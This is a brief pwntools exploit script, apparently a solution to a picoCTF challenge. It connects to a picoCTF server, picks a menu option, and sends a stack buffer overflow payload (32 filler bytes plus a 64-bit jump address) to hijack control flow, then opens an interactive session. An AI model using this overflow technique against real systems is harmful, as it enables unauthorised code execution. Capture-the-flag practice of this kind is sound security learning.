from pwn import *

r = remote('mimas.picoctf.net', 62418)
#r = process('./chall')

payload = b'a' * 32
payload += p64(0x004011a0)

r.sendline(b'2')
r.sendline(payload)

r.interactive()
